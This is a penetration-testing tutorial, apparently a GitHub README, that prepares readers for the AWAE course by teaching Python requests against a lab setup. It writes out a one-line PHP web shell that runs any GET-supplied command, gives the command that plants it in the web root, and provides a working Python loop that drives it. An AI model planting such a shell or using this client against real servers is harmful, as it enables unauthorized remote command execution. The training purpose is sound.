# Interact with Web Shells Using Python
Whether you're a seasoned penetration tester or a beginner, the field of penetration testing is a mile long and a mile deep; the opportunities within all the disciplines are endless. Offensive Security offers an advanced course called Advanced Web Attacks and Exploitation (AWAE) https://www.offensive-security.com/awae-oswe/ that focuses on white box web app penetration tests. 

## Objectives
Prior to registering for the course, you should ensure that you are familiar with writing scripts in at least one programming language. It is a common recommendation for you to focus on python and it's requests library. Interacting with web shells is a great way to practice both. However, once you start to get the hang of how it works, you could practice this with any language, all from your Kali Linux. Let's get our feet wet:

1. Hosting a Web Shell
2. Interface Class
3. Requests Module
4. Interacting with a Web Shell

## Hosting a Web Shell
A web shell is a web file that provides you a shell-like interface that you can use to interact with the operating system through arbitrary commands. For this example, we'll use a PHP file as it's a very simple syntax. On your Kali machine, simply create a php file on your web root with `<?php system($_GET["command"]); ?>` in the body and start up Apache.

```console
──(tristram㉿kali)-[~]
└─$ echo '<?php system($_GET["command"]); ?>' | sudo tee /var/www/html/shell.php
```

**Let's break down that PHP Code:**

* system is a built-in function that is used to execute the given command
* GET is a variable that contains form data from a get method
* command is the parameter that we'll use to pass our string with contains the command we want to have run via the system function

We can view this in action manually using our browser as such to confirm we have a working web shell:

![Alt text](https://github.com/gh0x0st/RCE_Web_Shell_Python/blob/main/Screenshots/browser_interaction.PNG?raw=true "browser_interaction")

## Interface Class
This piece is completely optional, but is a good habit to get into if you're new to writing scripts. Specifically, you should get into the habit of being consistent with your code so pieces are re-usable and readable. This can provide you a clean looking interface that you could re-use in various other scripts. 

Consider the following example of an interface class that we can be used to print banners and other formatted messages to the terminal:

```Python
# Simple interface class
class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Remote Code Execution')
        print('    >> https://www.github.com/gh0x0st\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
output = Interface()

# Output examples
output.header()
output.info('Informational Message')
output.warning('Warning Message')
output.error('Error Message')
output.success('Success Message')
```

Keep in mind when you create a class, `__init__` is executed every time you instantiate the class. Here, we'll use `__init__` to hold the values for our color codes. Then we'll define the functions or methods that will output our header and message logs when we call them from within our interface object.

![Alt text](https://github.com/gh0x0st/RCE_Web_Shell_Python/blob/main/Screenshots/interface_class.png?raw=true "interface_class")

## Requests Module
The requests module is a python library that allows you to make web requests, such as GET and POST requests. Within the AWAE course, you can imagine that would be extremely useful and it would be to your benefit to get comfortable with it before you start your course. It is also a very straight forward module to learn. 

With this example, all we're going to focus on are GET requests. It's relatively straight forward to invoke these requests, but play around and see what other information you could have stored in r after your initial request.

```Python
import requests
r = requests.get('http://127.0.0.1')
r.status_code
r.text
```

![Alt text](https://github.com/gh0x0st/RCE_Web_Shell_Python/blob/main/Screenshots/requests_module.png?raw=true "requests_module")

## Interacting with a Web Shell
Now that we have a web shell that we know we can interactive with manually via our browser, let's learn how to do so via the requests library. When we build a script that interacts with a web shell, we want to build in a way so we can interact it as if it was a terminal without having to run the script over and over for each command. 

To accomplish this, we'll use a `while True` loop that will constantly loop until we exit. Within this loop is where we'll use the requests library to make GET requests against the shell.php inserting our instruction into the 'command' parameter. 

You can also provide yourself a good visual indicator that you're connected with your web shell is to change the input text to something different using the `input` function. This is completely optional but gives you an opportunity to put your own style into your code.

```Python
# Remote code execution
while True:
    try:
        cmd = input("\033[91mRCE\033[0m > ")
        if cmd == 'exit':
            raise KeyboardInterrupt
        r = requests.get(target + "?command=" + cmd, verify=False)
        if r.status_code == 200:
            print(r.text)
        else:
            raise Exception
    except KeyboardInterrupt:
        sys.exit()
    except ConnectionError:
        output.error('We lost our connection to the web shell')
        sys.exit()
    except:
        output.error('Something unexpected happened')
        sys.exit()
```

![Alt text](https://github.com/gh0x0st/RCE_Web_Shell_Python/blob/main/Screenshots/rce_script.png?raw=true "rce_script")

## Putting it all together
By putting everything together, we can create ourselves a baseline script that we can use to interact with a web shell via python. Once you break down the tasks you need to accomplish into smaller bits, you'll see how easy it is to learn new aspects of a programming language that you might not be familiar with. 

If you want to take this to the next level, setup your Kali machine with a HTML form and a PHP file upload script and practice uploading files with a POST request and chain your script with what you've learned with GET requests to create a fully scripted exploit.

Be informed, be secure.
